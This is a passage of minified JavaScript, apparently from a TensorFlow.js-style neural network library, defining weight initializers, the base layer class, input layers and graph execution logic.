            return sg(t, this.mean, this.stddev, e, this.seed)
        }
        getConfig() {
            return {
                mean: this.mean,
                stddev: this.stddev,
                seed: this.seed
            }
        }
    }
    v0.className = "TruncatedNormal",
    _(v0);
    class S0 extends xn {
        constructor(t) {
            super(),
            this.gain = null != t.gain ? t.gain : 1
        }
        apply(t, e) {
            return M((()=>{
                if (2 !== t.length || t[0] !== t[1])
                    throw new $("Identity matrix initializer can only be used for 2D square matrices.");
                return E(this.gain, Xm(t[0]))
            }
            ))
        }
        getConfig() {
            return {
                gain: this.gain
            }
        }
    }
    S0.className = "Identity",
    _(S0);
    class Ye extends xn {
        constructor(t) {
            if (super(),
            t.scale < 0)
                throw new $(`scale must be a positive float. Got: ${t.scale}`);
            this.scale = null == t.scale ? 1 : t.scale,
            this.mode = null == t.mode ? "fanIn" : t.mode,
            function r$(n) {
                fo(s$, "FanMode", n)
            }(this.mode),
            this.distribution = null == t.distribution ? "normal" : t.distribution,
            function i$(n) {
                fo(o$, "Distribution", n)
            }(this.distribution),
            this.seed = t.seed
        }
        apply(t, e) {
            const s = function a$(n, t="channelsLast") {
                let e, s;
                if (se(t),
                2 === n.length)
                    e = n[0],
                    s = n[1];
                else if (-1 !== [3, 4, 5].indexOf(n.length)) {
                    if ("channelsFirst" === t) {
                        const o = Ns(n, 2);
                        e = n[1] * o,
                        s = n[0] * o
                    } else if ("channelsLast" === t) {
                        const o = Ns(n, 0, n.length - 2);
                        e = n[n.length - 2] * o,
                        s = n[n.length - 1] * o
                    }
                } else {
                    const o = Ns(n);
                    e = Math.sqrt(o),
                    s = Math.sqrt(o)
                }
                return [e, s]
            }(t)
              , o = s[0]
              , r = s[1];
            let i = this.scale;
            if ("fanIn" === this.mode ? i /= Math.max(1, o) : "fanOut" === this.mode ? i /= Math.max(1, r) : i /= Math.max(1, (o + r) / 2),
            "normal" === this.distribution) {
                const a = Math.sqrt(i);
                if ("float32" !== (e = e || "float32") && "int32" !== e)
                    throw new bt(`${this.getClassName()} does not support dType ${e}.`);
                return sg(t, 0, a, e, this.seed)
            }
            {
                const a = Math.sqrt(3 * i);
                return Li(t, -a, a, e, this.seed)
            }
        }
        getConfig() {
            return {
                scale: this.scale,
                mode: this.mode,
                distribution: this.distribution,
                seed: this.seed
            }
        }
    }
    Ye.className = "VarianceScaling",
    _(Ye);
    class Mh extends Ye {
        constructor(t) {
            super({
                scale: 1,
                mode: "fanAvg",
                distribution: "uniform",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    Mh.className = "GlorotUniform",
    _(Mh);
    class Vh extends Ye {
        constructor(t) {
            super({
                scale: 1,
                mode: "fanAvg",
                distribution: "normal",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    Vh.className = "GlorotNormal",
    _(Vh);
    class Fh extends Ye {
        constructor(t) {
            super({
                scale: 2,
                mode: "fanIn",
                distribution: "normal",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    Fh.className = "HeNormal",
    _(Fh);
    class zh extends Ye {
        constructor(t) {
            super({
                scale: 2,
                mode: "fanIn",
                distribution: "uniform",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    zh.className = "HeUniform",
    _(zh);
    class Xh extends Ye {
        constructor(t) {
            super({
                scale: 1,
                mode: "fanIn",
                distribution: "normal",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    Xh.className = "LeCunNormal",
    _(Xh);
    class Ah extends Ye {
        constructor(t) {
            super({
                scale: 1,
                mode: "fanIn",
                distribution: "uniform",
                seed: null == t ? null : t.seed
            })
        }
        getClassName() {
            return Ye.className
        }
    }
    Ah.className = "LeCunUniform",
    _(Ah);
    class k0 extends xn {
        constructor(t) {
            super(),
            this.DEFAULT_GAIN = 1,
            this.ELEMENTS_WARN_SLOW = 2e3,
            this.gain = null == t.gain ? this.DEFAULT_GAIN : t.gain,
            this.seed = t.seed
        }
        apply(t, e) {
            return M((()=>{
                if (t.length < 2)
                    throw new bt("Shape must be at least 2D.");
                if ("int32" !== e && "float32" !== e && void 0 !== e)
                    throw new TypeError(`Unsupported data type ${e}.`);
                const s = Z(t.slice(0, -1))
                  , o = t[t.length - 1]
                  , r = s * o;
                r > this.ELEMENTS_WARN_SLOW && console.warn(`Orthogonal initializer is being called on a matrix with more than ${this.ELEMENTS_WARN_SLOW} (${r}) elements: Slowness may result.`);
                const a = _c([Math.max(o, s), Math.min(o, s)], 0, 1, e, this.seed)
                  , c = gT.qr(a, !1);
                let l = c[0];
                const d = c[1].flatten().stridedSlice([0], [Math.min(o, s) * Math.min(o, s)], [Math.min(o, s) + 1]);
                return l = E(l, d.sign()),
                s < o && (l = l.transpose()),
                E(Gt(this.gain), l.reshape(t))
            }
            ))
        }
        getConfig() {
            return {
                gain: this.gain,
                seed: this.seed
            }
        }
    }
    k0.className = "Orthogonal",
    _(k0);
    const T0 = {
        constant: "Constant",
        glorotNormal: "GlorotNormal",
        glorotUniform: "GlorotUniform",
        heNormal: "HeNormal",
        heUniform: "HeUniform",
        identity: "Identity",
        leCunNormal: "LeCunNormal",
        leCunUniform: "LeCunUniform",
        ones: "Ones",
        orthogonal: "Orthogonal",
        randomNormal: "RandomNormal",
        randomUniform: "RandomUniform",
        truncatedNormal: "TruncatedNormal",
        varianceScaling: "VarianceScaling",
        zeros: "Zeros"
    };
    function N0(n, t={}) {
        return zi(n, mn.getMap().classNameMap, t, "initializer")
    }
    function Qt(n) {
        return Th(n)
    }
    function Ht(n) {
        if ("string" == typeof n) {
            const t = n in T0 ? T0[n] : n;
            if ("GlorotNormal" === t)
                return new Vh;
            if ("GlorotUniform" === t)
                return new Mh;
            if ("HeNormal" === t)
                return new Fh;
            if ("HeUniform" === t)
                return new zh;
            if ("LeCunNormal" === t)
                return new Xh;
            if ("LeCunUniform" === t)
                return new Ah;
            {
                const e = {};
                return e.className = t,
                e.config = {},
                N0(e)
            }
        }
        return n instanceof xn ? n : N0(n)
    }
    function Ph(n) {
        return Array.isArray(n) && Array.isArray(n[0])
    }
    function Uc(n) {
        return 0 === n.length ? [] : Array.isArray(n[0]) ? n : [n]
    }
    function mt(n) {
        let t;
        if (Array.isArray(n)) {
            if (1 !== n.length)
                throw new $(`Expected Tensor length to be 1; got ${n.length}`);
            t = n[0]
        } else
            t = n;
        return t
    }
    function Nt(n) {
        if (Array.isArray(n) && Array.isArray(n[0])) {
            if (1 === n.length)
                return n[0];
            throw new $(`Expected exactly 1 Shape; got ${n.length}`)
        }
        return n
    }
    function Yc(n) {
        let t = 0;
        for (const e of n)
            0 === e.shape.length ? t += 1 : t += e.shape.reduce(((s,o)=>s * o));
        return t
    }
    const R0 = "Variable";
    class c$ {
        constructor(t, e="float32", s=R0, o=!0, r=null) {
            this.dtype = e ?? "float32",
            this.shape = t.shape,
            this.id = u0(),
            s = s ?? R0,
            this.originalName = p0(s),
            this.name = f0(this.originalName),
            this.trainable_ = o,
            this.constraint = r,
            this.val = function gk(n, t=!0, e, s) {
                return G.makeVariable(n, t, e, s)
            }(t, this.trainable_, this.name, this.dtype)
        }
        read() {
            return this.assertNotDisposed(),
            this.val
        }
        write(t) {
            return this.assertNotDisposed(),
            function l$(n, t) {
                if (n.shape.toString() !== t.shape.toString())
                    throw new Error("Shape mismatch: " + JSON.stringify(n.shape) + " vs. " + JSON.stringify(t.shape))
            }(this.val, t),
            this.val.id !== t.id && (this.val.assign(t),
            null != this.constraint && this.val.assign(this.constraint.apply(this.val))),
            this
        }
        dispose() {
            this.assertNotDisposed(),
            this.val.dispose()
        }
        assertNotDisposed() {
            if (this.val.isDisposed)
                throw new Error(`LayersVariable ${this.name} is already disposed.`)
        }
        get trainable() {
            return this.trainable_
        }
        set trainable(t) {
            this.trainable_ = t,
            this.val.trainable = t
        }
    }
    function Oh(n) {
        return n.map((t=>t.read()))
    }
    function Kh(n) {
        n.forEach((t=>{
            t[0].write(t[1])
        }
        ))
    }
    class ue {
        constructor(t) {
            this.dtype = t.dtype,
            this.shape = t.shape,
            null != t.shape ? this.ndim = t.shape.length : this.ndim = t.ndim,
            this.maxNDim = t.maxNDim,
            this.minNDim = t.minNDim,
            this.axes = t.axes || {}
        }
    }
    class Un {
        constructor(t, e, s, o, r, i, a) {
            this.dtype = t,
            this.shape = e,
            this.sourceLayer = s,
            this.inputs = o,
            this.callArgs = r,
            this.outputTensorIndex = a,
            this.id = u0(),
            null != i && (this.originalName = p0(i),
            this.name = f0(this.originalName)),
            this.rank = e.length
        }
    }
    let u$ = 0;
    class Qc {
        constructor(t, e) {
            this.callArgs = e,
            this.id = u$++,
            this.outboundLayer = t.outboundLayer,
            this.inboundLayers = t.inboundLayers,
            this.nodeIndices = t.nodeIndices,
            this.tensorIndices = t.tensorIndices,
            this.inputTensors = t.inputTensors,
            this.outputTensors = t.outputTensors,
            this.inputMasks = t.inputMasks,
            this.outputMasks = t.outputMasks,
            this.inputShapes = t.inputShapes,
            this.outputShapes = t.outputShapes;
            for (const s of t.inboundLayers)
                null != s && s.outboundNodes.push(this);
            t.outboundLayer.inboundNodes.push(this)
        }
        getConfig() {
            const t = [];
            for (const e of this.inboundLayers)
                null != e ? t.push(e.name) : t.push(null);
            return {
                outboundLayer: this.outboundLayer ? this.outboundLayer.name : null,
                inboundLayers: t,
                nodeIndices: this.nodeIndices,
                tensorIndices: this.tensorIndices
            }
        }
    }
    let d$ = 0;
    class Ct extends qo {
        constructor(t={}) {
            super(),
            this._callHook = null,
            this._addedWeightNames = [],
            this._stateful = !1,
            this.id = d$++,
            this.activityRegularizer = null,
            this.inputSpec = null,
            this.supportsMasking = !1,
            this._trainableWeights = [],
            this._nonTrainableWeights = [],
            this._losses = [],
            this._updates = [],
            this._built = !1,
            this.inboundNodes = [],
            this.outboundNodes = [];
            let e = t.name;
            if (!e) {
                const s = this.getClassName();
                e = ls(s) + "_" + Bc(s)
            }
            if (this.name = e,
            this.trainable_ = null == t.trainable || t.trainable,
            null != t.inputShape || null != t.batchInputShape) {
                let s;
                if (null != t.batchInputShape)
                    s = t.batchInputShape;
                else if (null != t.inputShape) {
                    let r = null;
                    null != t.batchSize && (r = t.batchSize),
                    s = [r].concat(t.inputShape)
                }
                this.batchInputShape = s;
                let o = t.dtype;
                null == o && (o = t.inputDType),
                null == o && (o = "float32"),
                this.dtype = o
            }
            null != t.weights ? this.initialWeights = t.weights : this.initialWeights = null,
            this._refCount = null,
            this.fastWeightInitDuringBuild = !1
        }
        static nodeKey(t, e) {
            return t.name + "_ib-" + e.toString()
        }
        getNodeAtIndex(t, e) {
            if (0 === this.inboundNodes.length)
                throw new gn(`The layer has never been called and thus has no defined ${e}.`);
            if (this.inboundNodes.length <= t)
                throw new $(`Asked to get ${e} at node ${t}, but the layer has only ${this.inboundNodes.length} inbound nodes.`);
            return this.inboundNodes[t]
        }
        getInputAt(t) {
            return Pe(this.getNodeAtIndex(t, "input").inputTensors)
        }
        getOutputAt(t) {
            return Pe(this.getNodeAtIndex(t, "output").outputTensors)
        }
        get input() {
            if (this.inboundNodes.length > 1)
                throw new Zn(`Layer ${this.name} has multiple inbound nodes, hence the notion of "layer input" is ill-defined. Use \`getInputAt(nodeIndex)\` instead.`);
            if (0 === this.inboundNodes.length)
                throw new Zn(`Layer ${this.name} is not connected, no input to return.`);
            return Pe(this.getNodeAtIndex(0, "input").inputTensors)
        }
        get output() {
            if (0 === this.inboundNodes.length)
                throw new Zn(`Layer ${this.name} has no inbound nodes.`);
            if (this.inboundNodes.length > 1)
                throw new Zn(`Layer ${this.name} has multiple inbound nodes, hence the notion of "layer output" is ill-defined. Use \`getOutputAt(nodeIndex)\` instead.`);
            return Pe(this.getNodeAtIndex(0, "output").outputTensors)
        }
        get losses() {
            return this._losses
        }
        calculateLosses() {
            return this.losses.map((t=>t()))
        }
        get updates() {
            return this._updates
        }
        get built() {
            return this._built
        }
        set built(t) {
            this._built = t
        }
        get trainable() {
            return this.trainable_
        }
        set trainable(t) {
            this._trainableWeights.forEach((e=>e.trainable = t)),
            this.trainable_ = t
        }
        get trainableWeights() {
            return this.trainable_ ? this._trainableWeights.filter((t=>t.trainable)) : []
        }
        set trainableWeights(t) {
            this._trainableWeights = t
        }
        get nonTrainableWeights() {
            return this.trainable ? this._trainableWeights.filter((t=>!t.trainable)).concat(this._nonTrainableWeights) : this._trainableWeights.concat(this._nonTrainableWeights)
        }
        set nonTrainableWeights(t) {
            this._nonTrainableWeights = t
        }
        get weights() {
            return this.trainableWeights.concat(this.nonTrainableWeights)
        }
        get stateful() {
            return this._stateful
        }
        resetStates() {
            if (!this.stateful)
                throw new Error("Cannot call the resetStates() method of a non-stateful Layer object.")
        }
        assertInputCompatibility(t) {
            const e = Lt(t);
            if (null == this.inputSpec || 0 === this.inputSpec.length)
                return;
            const s = Lt(this.inputSpec);
            if (e.length !== s.length)
                throw new $(`Layer ${this.name} expects ${s.length} inputs, but it received ${e.length} input tensors. Input received: ${t}`);
            for (let o = 0; o < e.length; o++) {
                const r = e[o]
                  , i = s[o];
                if (null == i)
                    continue;
                const a = r.rank;
                if (null != i.ndim && a !== i.ndim)
                    throw new $(`Input ${o} is incompatible with layer ${this.name}: expected ndim=${i.ndim}, found ndim=${a}`);
                if (null != i.maxNDim && a > i.maxNDim)
                    throw new $(`Input ${o} is incompatible with layer ${this.name}: expected max_ndim=${i.maxNDim}, found ndim=${a}`);
                if (null != i.minNDim && a < i.minNDim)
                    throw new $(`Input ${o} is incompatible with layer ${this.name}: expected min_ndim=${i.minNDim}, found ndim=${a}.`);
                if (null != i.dtype && r.dtype !== i.dtype)
                    throw new $(`Input ${o} is incompatible with layer ${this.name} : expected dtype=${i.dtype}, found dtype=${r.dtype}.`);
                if (i.axes) {
                    const c = r.shape;
                    for (const l in i.axes) {
                        const u = Number(l)
                          , d = i.axes[l]
                          , h = u >= 0 ? c[u] : c[c.length + u];
                        if (null != d && -1 === [d, null].indexOf(h))
                            throw new $(`Input ${o} is incompatible with layer ${this.name}: expected axis ${u} of input shape to have value ${d} but got shape ${c}.`)
                    }
                }
                if (null != i.shape)
                    for (let c = 0; c < i.shape.length; ++c) {
                        const l = i.shape[c]
                          , u = r.shape[c];
                        if (null != l && null != u && l !== u)
                            throw new $(`Input ${o} is incompatible with layer ${this.name}: expected shape=${i.shape}, found shape=${r.shape}.`)
                    }
            }
        }
        call(t, e) {
            return t
        }
        invokeCallHook(t, e) {
            null != this._callHook && this._callHook(t, e)
        }
        setCallHook(t) {
            this._callHook = t
        }
        clearCallHook() {
            this._callHook = null
        }
        apply(t, e) {
            e = e || {},
            this.assertNotDisposed();
            const s = Lt(t)
              , o = function f$(n) {
                let t = !0;
                for (const e of Lt(n))
                    if (!(e instanceof Un)) {
                        t = !1;
                        break
                    }
                return t
            }(t)
              , r = function m$(n) {
                let t = !0;
                for (const e of Lt(n))
                    if (e instanceof Un) {
                        t = !1;
                        break
                    }
                return t
            }(t);
            if (o === r)
                throw new $("Arguments to apply() must be all SymbolicTensors or all Tensors");
            return mo(this.name, (()=>{
                if (!this.built) {
                    this.assertInputCompatibility(t);
                    const i = [];
                    for (const a of Lt(t))
                        i.push(a.shape);
                    this.build(Pe(i)),
                    this.built = !0,
                    this.initialWeights && this.setWeights(this.initialWeights),
                    null === this._refCount && r && (this._refCount = 1)
                }
                if (this.assertInputCompatibility(t),
                r) {
                    let i = this.call(t, e);
                    this.supportsMasking && this.setMaskMetadata(t, i);
                    const a = Lt(i)
                      , c = [];
                    for (let l of a)
                        -1 !== s.indexOf(l) && (l = l.clone()),
                        c.push(l);
                    if (i = Pe(c),
                    null != this.activityRegularizer)
                        throw new bt("Layer invocation in the presence of activity regularizer(s) is not supported yet.");
                    return i
                }
                {
                    const i = function h$(n) {
                        n = Lt(n);
                        const t = [];
                        for (const e of n)
                            t.push(e.shape);
                        return Pe(t)
                    }(t)
                      , a = this.computeOutputShape(i);
                    let c;
                    const l = "float32";
                    if (this.warnOnIncompatibleInputShape(Array.isArray(t) ? i[0] : i),
                    c = null != a && a.length > 0 && Array.isArray(a[0]) ? a.map(((u,d)=>new Un(l,u,this,Lt(t),e,this.name,d))) : new Un(l,a,this,Lt(t),e,this.name),
                    this.addInboundNode(t, c, null, null, i, a, e),
                    this._refCount++,
                    null != this.activityRegularizer)
                        throw new bt("Layer invocation in the presence of activity regularizer(s) is not supported yet.");
                    return c
                }
            }
            ))
        }
        warnOnIncompatibleInputShape(t) {
            if (null != this.batchInputShape)
                if (t.length !== this.batchInputShape.length)
                    console.warn(`The rank of the input tensor provided (shape: ${JSON.stringify(t)}) does not match that of the batchInputShape (${JSON.stringify(this.batchInputShape)}) of the layer ${this.name}`);
                else {
                    let e = !1;
                    this.batchInputShape.forEach(((s,o)=>{
                        null != s && null != t[o] && t[o] !== s && (e = !0)
                    }
                    )),
                    e && console.warn(`The shape of the input tensor (${JSON.stringify(t)}) does not match the expectation of layer ${this.name}: ${JSON.stringify(this.batchInputShape)}`)
                }
        }
        get outputShape() {
            if (null == this.inboundNodes || 0 === this.inboundNodes.length)
                throw new Zn(`The layer ${this.name} has never been called and thus has no defined output shape.`);
            const t = [];
            for (const e of this.inboundNodes) {
                const s = JSON.stringify(e.outputShapes);
                -1 === t.indexOf(s) && t.push(s)
            }
            if (1 === t.length) {
                const e = this.inboundNodes[0].outputShapes;
                return Array.isArray(e) && Array.isArray(e[0]) && 1 === e.length ? e[0] : e
            }
            throw new Zn(`The layer ${this.name} has multiple inbound nodes with different output shapes. Hence the notion of "output shape" is ill-defined for the layer.`)
        }
        countParams() {
            if (!this.built)
                throw new gn(`You tried to call countParams() on ${this.name}, but the layer is not built yet. Build it first by calling build(batchInputShape).`);
            return Yc(this.weights)
        }
        build(t) {
            this.built = !0
        }
        getWeights(t=!1) {
            return Oh(t ? this.trainableWeights : this.weights)
        }
        setWeights(t) {
            M((()=>{
                const e = this.weights;
                if (e.length !== t.length)
                    throw new $(`You called setWeights(weights) on layer "${this.name}" with a weight list of length ${t.length}, but the layer was expecting ${e.length} weights. Provided weights: ${t}...`);
                if (0 === e.length)
                    return;
                const s = []
                  , o = Oh(e);
                for (let r = 0; r < o.length; ++r) {
                    const i = o[r]
                      , a = e[r]
                      , c = t[r];
                    if (!Rt(i.shape, c.shape))
                        throw new $(`Layer weight shape ${i.shape} not compatible with provided weight shape ${c.shape}`);
                    s.push([a, c])
                }
                Kh(s)
            }
            ))
        }
        addWeight(t, e, s, o, r, i, a, c) {
            if (-1 !== this._addedWeightNames.indexOf(t))
                throw new $(`Duplicate weight name ${t} for layer ${this.name}`);
            this._addedWeightNames.push(t),
            null == s && (s = "float32"),
            this.fastWeightInitDuringBuild && (o = null != c ? c() : Ht("zeros"));
            const l = o.apply(e, s)
              , u = new c$(l,s,t,i,a);
            return l.dispose(),
            null != r && this.addLoss((()=>r.apply(u.read()))),
            null == i && (i = !0),
            i ? this._trainableWeights.push(u) : this._nonTrainableWeights.push(u),
            u
        }
        setFastWeightInitDuringBuild(t) {
            this.fastWeightInitDuringBuild = t
        }
        addLoss(t) {
            null == t || Array.isArray(t) && 0 === t.length || (t = Lt(t),
            void 0 !== this._losses && null !== this._losses && this.losses.push(...t))
        }
        computeOutputShape(t) {
            return t
        }
        computeMask(t, e) {
            if (!this.supportsMasking) {
                if (null != e) {
                    if (!Array.isArray(e))
                        throw new TypeError(`Layer ${this.name} does not support masking, but was passed an inputMask.`);
                    e.forEach((s=>{
                        if (null != s)
                            throw new TypeError(`Layer ${this.name} does not support masking, but was passed an inputMask.`)
                    }
                    ))
                }
                return null
            }
            return e
        }
        setMaskMetadata(t, e, s) {
            if (!this.supportsMasking)
                return;
            const o = this.computeMask(t, s)
              , r = Lt(e)
              , i = Lt(o);
            if (r.length !== i.length)
                throw new Error(`${this.name} outputs ${r.length} tensors but ${r.length} masks for those tensors`);
            for (let a = 0; a < r.length; a++)
                r[a].kerasMask = i[a]
        }
        addInboundNode(t, e, s, o, r, i, a=null) {
            const c = Lt(t);
            e = Lt(e),
            s = Lt(s),
            o = Lt(o),
            r = Uc(r),
            i = Uc(i);
            const l = []
              , u = []
              , d = [];
            for (const h of c)
                l.push(h.sourceLayer),
                u.push(h.nodeIndex),
                d.push(h.tensorIndex);
            new Qc({
                outboundLayer: this,
                inboundLayers: l,
                nodeIndices: u,
                tensorIndices: d,
                inputTensors: c,
                outputTensors: e,
                inputMasks: s,
                outputMasks: o,
                inputShapes: r,
                outputShapes: i
            },a);
            for (let h = 0; h < e.length; h++)
                e[h].sourceLayer = this,
                e[h].nodeIndex = this.inboundNodes.length - 1,
                e[h].tensorIndex = h
        }
        getConfig() {
            const t = {
                name: this.name,
                trainable: this.trainable
            };
            return null != this.batchInputShape && (t.batchInputShape = this.batchInputShape),
            null != this.dtype && (t.dtype = this.dtype),
            t
        }
        disposeWeights() {
            return this.weights.forEach((t=>t.dispose())),
            this.weights.length
        }
        assertNotDisposed() {
            if (0 === this._refCount)
                throw new Error(`Layer '${this.name}' is already disposed.`)
        }
        dispose() {
            if (!this.built)
                throw new Error(`Cannot dispose Layer ${this.name} because it has not been built yet.`);
            if (null === this._refCount)
                throw new Error(`Cannot dispose Layer ${this.name} because it has not been used yet.`);
            this.assertNotDisposed();
            let t = 0;
            return 0 == --this._refCount && (t = this.disposeWeights()),
            {
                refCountAfterDispose: this._refCount,
                numDisposedVariables: t
            }
        }
    }
    function $0(n, t, e) {
        if ((null == t || null != e && e > 0) && (t = n.sourceLayer,
        e = n.nodeIndex),
        0 === t.inboundNodes.length)
            return [n];
        {
            const s = t.inboundNodes[e];
            if (0 === s.inboundLayers.length)
                return s.inputTensors;
            {
                const o = [];
                for (let r = 0; r < s.inboundLayers.length; r++) {
                    const l = $0(s.inputTensors[r], s.inboundLayers[r], s.nodeIndices[r]);
                    for (const u of l)
                        -1 === o.indexOf(u) && o.push(u)
                }
                return o
            }
        }
    }
    class Ki extends Ct {
        constructor(t) {
            if (super({
                dtype: t.dtype,
                name: null != t.name ? t.name : Bc("input").toString()
            }),
            null == t.batchSize && (t.batchSize = null),
            null == t.sparse && (t.sparse = !1),
            this.trainable = !1,
            this.built = !0,
            this.sparse = t.sparse,
            null != t.inputShape && null != t.batchInputShape)
                throw new $("Only provide the inputShape OR batchInputShape argument to inputLayer, not both at the same time.");
            let e = t.batchInputShape;
            if (null == e) {
                if (null == t.inputShape)
                    throw new $("An InputLayer should be passed either a `batchInputShape` or an `inputShape`.");
                e = [t.batchSize].concat(t.inputShape)
            } else if (null != t.batchSize)
                throw new $("Cannot specify batchSize if batchInputShape is specified when creating an InputLayer.");
            const s = t.dtype || "float32";
            this.batchInputShape = e,
            this.dtype = s,
            this.inputSpec = [{
                shape: e
            }];
            const o = new Un(this.dtype,this.batchInputShape,this,[],{},this.name);
            o.nodeIndex = 0,
            o.tensorIndex = 0,
            new Qc({
                outboundLayer: this,
                inboundLayers: [],
                nodeIndices: [],
                tensorIndices: [],
                inputTensors: [o],
                outputTensors: [o],
                inputMasks: [null],
                outputMasks: [null],
                inputShapes: [e],
                outputShapes: [e]
            })
        }
        apply(t, e) {
            throw new $(`Cannot pass any input to an InputLayer's apply() method. InputLayer name: ${this.name}`)
        }
        dispose() {
            return {
                refCountAfterDispose: this._refCount,
                numDisposedVariables: 0
            }
        }
        getConfig() {
            return {
                batchInputShape: this.batchInputShape,
                dtype: this.dtype,
                sparse: this.sparse,
                name: this.name
            }
        }
    }
    Ki.className = "InputLayer",
    _(Ki);
    class $s {
        constructor(t) {
            if (this.id2Value = {},
            this.id2Mask = {},
            this.name2Id = {},
            t instanceof $s)
                for (const e in t.id2Value)
                    this.id2Value[e] = t.id2Value[e],
                    e in t.id2Mask && (this.id2Mask[e] = t.id2Mask[e]);
            else {
                if (null == t)
                    return;
                for (const e of t)
                    this.add(e.key, e.value)
            }
        }
        add(t, e, s) {
            if (null != this.id2Value[t.id])
                throw new $(`Duplicate key: name=${t.name}, id=${t.id}`);
            return this.id2Value[t.id] = function b$(n, t) {
                if (null == n.dtype || n.dtype === t.dtype)
                    return t;
                try {
                    return st(t, n.dtype)
                } catch {
                    throw new $(`The dtype of the feed (${t.dtype}) can not be cast to the dtype of the key '${n.name}' (${n.dtype}).`)
                }
            }(t, e),
            this.name2Id[t.name] = t.id,
            null != s && (this.id2Mask[t.id] = s),
            this
        }
        addFeed(t) {
            this.add(t.key, t.value)
        }
        hasKey(t) {
            return null != this.id2Value[t.id]
        }
        names() {
            return Object.keys(this.name2Id)
        }
        getValue(t) {
            if (t instanceof Un) {
                if (null == this.id2Value[t.id])
                    throw new $(`Nonexistent key: ${t.name}`);
                return this.id2Value[t.id]
            }
            {
                const e = this.name2Id[t];
                if (null == e)
                    throw new $(`Feed dict has no SymbolicTensor name: ${t}`);
                return this.id2Value[e]
            }
        }
        getMask(t) {
            if (t instanceof Un) {
                if (null == this.id2Value[t.id])
                    throw new $(`Nonexistent key: ${t.name}`);
                return this.id2Mask[t.id]
            }
            {
                const e = this.name2Id[t];
                if (null == e)
                    throw new $(`Feed dict has no SymbolicTensor name: ${t}`);
                return this.id2Mask[e]
            }
        }
        disposeMasks() {
            null != this.id2Mask && vt(this.id2Mask)
        }
    }
    const Jc = new i0
      , jc = new i0;
    function Zi(n, t, e, s) {
        const o = null != e && e.training
          , r = Array.isArray(n)
          , i = r ? n : [n]
          , a = i.map((f=>f.name))
          , c = []
          , l = t.names();
        for (const f of a)
            -1 !== l.indexOf(f) ? c.push(t.getValue(f)) : c.push(null);
        null != s && (s.maxNumTensors = -1 / 0,
        s.minNumTensors = 1 / 0);
        const u = a.join(",") + "|" + t.names().sort().join(",");
        let h, d = Jc.get(u);
        if (null == d) {
            const f = function y$(n, t) {
                v(null != n && n.length > 0, (()=>"Expected at least one fetch, got none"));
                let e = []
                  , s = {};
                if (1 === n.length) {
                    const o = G0(n[0], t);
                    e = o.sorted,
                    s = o.recipientMap
                } else {
                    const o = new Set;
                    for (const r of n) {
                        const {sorted: i, recipientMap: a} = G0(r, t);
                        for (const c of i)
                            o.has(c.name) || (e.push(c),
                            o.add(c.name));
                        for (const c in a)
                            null == s[c] && (s[c] = new Set),
                            a[c].forEach((l=>s[c].add(l)))
                    }
                }
                return {
                    sorted: e,
                    recipientCounts: I$(s)
                }
            }(i, t);
            d = f.sorted,
            h = f.recipientCounts,
            Jc.put(u, d),
            jc.put(u, h)
        }
        h = {},
        o || Object.assign(h, jc.get(u));
        const p = new $s(t);
        for (let f = 0; f < d.length; ++f) {
            if (null != s) {
                const T = Nc().numTensors;
                T > s.maxNumTensors && (s.maxNumTensors = T),
                T < s.minNumTensors && (s.minNumTensors = T)
            }
            const m = d[f]
              , g = m.sourceLayer;
            if (g instanceof Ki)
                continue;
            const b = []
              , x = []
              , I = [];
            let y = !1;
            for (const T of m.inputs) {
                const R = p.getValue(T)
                  , L = p.getMask(T);
                b.push(R),
                x.push(L),
                null != L && (y = !0),
                o || (h[T.name]--,
                0 === h[T.name] && !t.hasKey(T) && -1 === a.indexOf(T.name) && !R.isDisposed && !0 !== T.sourceLayer.stateful && I.push(R))
            }
            y && ((e = e || {}).mask = x[0]);
            const w = Lt(g.apply(b, e));
            let C = null;
            g.supportsMasking && (C = g.computeMask(b, x));
            const k = w$(m)
              , S = Array.isArray(k) ? k : [k];
            for (let T = 0; T < S.length; ++T) {
                p.hasKey(S[T]) || p.add(S[T], w[T], Array.isArray(C) ? C[0] : C);
                const R = a.indexOf(S[T].name);
                -1 !== R && (c[R] = w[T])
            }
            o || vt(I)
        }
        return p.disposeMasks(),
        r ? c : c[0]
    }
    function I$(n) {
        const t = {};
        for (const e in n)
            t[e] = n[e].size;
        return t
    }
    function G0(n, t) {
        const e = new Set
          , s = []
          , o = {};
        for (const a of t.names())
            e.add(a);
        const r = []
          , i = [];
        for (r.push(n); r.length > 0; ) {
            const a = r[r.length - 1];
            if (e.has(a.name)) {
                r.pop();
                continue
            }
            const c = i[i.length - 1] === r.length - 1;
            if (0 === a.inputs.length || c)
                r.pop(),
                s.push(a),
                e.add(a.name),
                c && i.pop();
            else {
                i.push(r.length - 1);
                for (const l of a.inputs)
                    null == o[l.name] && (o[l.name] = new Set),
                    o[l.name].add(a.name),
                    !e.has(l.name) && r.push(l)
            }
        }
        return {
            sorted: s,
            recipientMap: o
        }
    }
    function w$(n) {
        let t;
        if (1 === n.sourceLayer.inboundNodes.length)
            t = n.sourceLayer.output;
        else {
            let e = null;
            for (let s = 0; s < n.sourceLayer.inboundNodes.length; ++s)
                for (const o of n.sourceLayer.inboundNodes[s].outputTensors)
                    if (o.id === n.id) {
                        e = s;
                        break
                    }
            t = n.sourceLayer.getOutputAt(e)
        }
        return t
    }
    function Zh(n, t) {
        return M((()=>Ee(ut(E(n, n), t, !0))))
    }
    z().registerFlag("TOPOLOGICAL_SORT_CACHE_MAX_ENTRIES", (()=>100), (function x$(n) {
        null != Jc && Jc.setMaxEntries(n),
        null != jc && jc.setMaxEntries(n)
    }
    ));
    class Bi extends qo {
        getConfig() {
            return {}
        }
    }
    class L0 extends Bi {
        constructor(t) {
            super(),
            this.defaultMaxValue = 2,
            this.defaultAxis = 0,
            this.maxValue = null != t.maxValue ? t.maxValue : this.defaultMaxValue,
            this.axis = null != t.axis ? t.axis : this.defaultAxis
        }
        apply(t) {
            return M((()=>{
                const e = Zh(t, this.axis)
                  , s = nn(e, 0, this.maxValue);
                return E(t, dt(s, Q(le(), e)))
            }
            ))
        }
        getConfig() {
            return {
                maxValue: this.maxValue,
                axis: this.axis
            }
        }
    }
    L0.className = "MaxNorm",
    _(L0);
    class E0 extends Bi {
        constructor(t) {
            super(),
            this.defaultAxis = 0,
